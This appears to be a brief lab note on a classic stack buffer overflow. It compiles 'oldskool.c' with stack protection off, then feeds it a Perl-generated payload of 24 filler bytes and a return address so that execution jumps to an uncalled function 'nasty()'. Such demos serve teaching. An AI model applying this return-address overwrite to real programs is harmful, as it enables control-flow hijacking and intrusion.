
gcc oldskool.c -o oldskool -zexecstack -fno-stack-protector -g


run `perl -e 'print "\x41"x24 . "\x18\x06\x40\x00\x00\x00\x00\x00";'`

By running GDB command aboved, function "nasty()" can be executed as expected.
"a little nasty" will be print according to the nasty(), which has not been called in the main().
